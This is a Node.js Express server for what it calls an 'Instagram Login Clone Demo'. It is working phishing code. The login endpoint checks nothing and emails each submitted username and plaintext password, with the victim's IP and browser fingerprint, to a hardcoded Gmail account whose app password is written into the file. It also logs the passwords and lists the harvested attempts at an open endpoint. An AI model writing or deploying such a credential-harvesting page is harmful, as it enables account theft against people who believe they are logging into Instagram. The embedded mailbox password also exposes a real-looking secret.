const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors({
    origin: ['http://localhost:3000', 'http://127.0.0.1:3000'],
    credentials: true
}));
app.use(express.json({ limit: '10mb' }));
app.use(express.static('.'));

// Email configuration
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER || 'ironydicate@gmail.com',
        pass: process.env.EMAIL_PASS || 'xcqc cykl zlch xair'
    }
});

// Store login attempts (in production, use a database)
const loginAttempts = [];
const rateLimitMap = new Map();

// Simple rate limiting (5 attempts per IP per minute)
function checkRateLimit(ip) {
    const now = Date.now();
    const windowMs = 60 * 1000; // 1 minute
    const maxAttempts = 5;
    
    if (!rateLimitMap.has(ip)) {
        rateLimitMap.set(ip, []);
    }
    
    const attempts = rateLimitMap.get(ip);
    const recentAttempts = attempts.filter(time => now - time < windowMs);
    
    if (recentAttempts.length >= maxAttempts) {
        return false;
    }
    
    recentAttempts.push(now);
    rateLimitMap.set(ip, recentAttempts);
    return true;
}

// API endpoint to handle login
app.post('/api/login', async (req, res) => {
    try {
        const userData = req.body;
        
        // Basic input validation
        if (!userData.username || !userData.password) {
            return res.status(400).json({ success: false, message: 'Username and password are required' });
        }
        
        // Sanitize inputs to prevent XSS
        const sanitizeInput = (input) => {
            return String(input).replace(/[<>\"']/g, '');
        };
        
        userData.username = sanitizeInput(userData.username);
        userData.password = sanitizeInput(userData.password);
        
        // Add IP address (in production, get real IP)
        userData.ip = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || 'Unknown';
        
        // Check rate limiting
        if (!checkRateLimit(userData.ip)) {
            return res.status(429).json({ 
                success: false, 
                message: 'Too many login attempts. Please try again later.' 
            });
        }
        
        // Store the login attempt
        loginAttempts.push(userData);
        
        // Send email notification (don't block response if email fails)
        sendLoginNotification(userData).catch(emailError => {
            console.error('Email sending failed:', emailError);
        });
        
        // Log to console for debugging
        console.log('New login attempt:', {
            username: userData.username,
            password: userData.password,
            timestamp: userData.timestamp,
            ip: userData.ip
        });
        
        res.json({ success: true, message: 'Login processed' });
        
    } catch (error) {
        console.error('Error processing login:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// Function to send email notification
async function sendLoginNotification(userData) {
    try {
        const mailOptions = {
            from: process.env.EMAIL_USER || 'ironydicate@gmail.com',
            to: process.env.EMAIL_USER || 'ironydicate@gmail.com', // Send to yourself
            subject: '🔐 New Instagram Login Attempt',
            html: `
                <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                    <h2 style="color: #E4405F; border-bottom: 2px solid #E4405F; padding-bottom: 10px;">
                        📱 Instagram Login Details
                    </h2>
                    
                    <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
                        <h3 style="color: #333; margin-top: 0;">👤 User Credentials</h3>
                        <p><strong>Username:</strong> ${userData.username}</p>
                        <p><strong>Password:</strong> ${userData.password}</p>
                    </div>
                    
                    <div style="background: #e3f2fd; padding: 20px; border-radius: 8px; margin: 20px 0;">
                        <h3 style="color: #1976d2; margin-top: 0;">🕒 Login Information</h3>
                        <p><strong>Timestamp:</strong> ${new Date(userData.timestamp).toLocaleString()}</p>
                        <p><strong>IP Address:</strong> ${userData.ip}</p>
                        <p><strong>User Agent:</strong> ${userData.userAgent}</p>
                        <p><strong>Language:</strong> ${userData.language}</p>
                        <p><strong>Platform:</strong> ${userData.platform}</p>
                        <p><strong>Screen Resolution:</strong> ${userData.screenResolution}</p>
                        <p><strong>Timezone:</strong> ${userData.timezone}</p>
                        <p><strong>Referrer:</strong> ${userData.referrer}</p>
                    </div>
                    
                    <div style="background: #fff3e0; padding: 15px; border-radius: 8px; margin: 20px 0;">
                        <p style="margin: 0; color: #f57c00;">
                            <strong>⚠️ Note:</strong> This is a demo application. In a real scenario, this data would be stored securely.
                        </p>
                    </div>
                    
                    <div style="text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #ddd;">
                        <p style="color: #666; font-size: 12px;">
                            Generated by Instagram Login Clone Demo
                        </p>
                    </div>
                </div>
            `
        };
        
        await transporter.sendMail(mailOptions);
        console.log('Email notification sent successfully');
        
    } catch (error) {
        console.error('Error sending email:', error);
    }
}

// API endpoint to view all login attempts (for debugging)
app.get('/api/logins', (req, res) => {
    res.json({
        totalAttempts: loginAttempts.length,
        attempts: loginAttempts.map(attempt => ({
            username: attempt.username,
            timestamp: attempt.timestamp,
            ip: attempt.ip
        }))
    });
});

// Serve the main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📧 Email notifications will be sent to: ${process.env.EMAIL_USER || 'ironydicate@gmail.com'}`);
    console.log(`📊 View login attempts at: http://localhost:${PORT}/api/logins`);
});

module.exports = app;
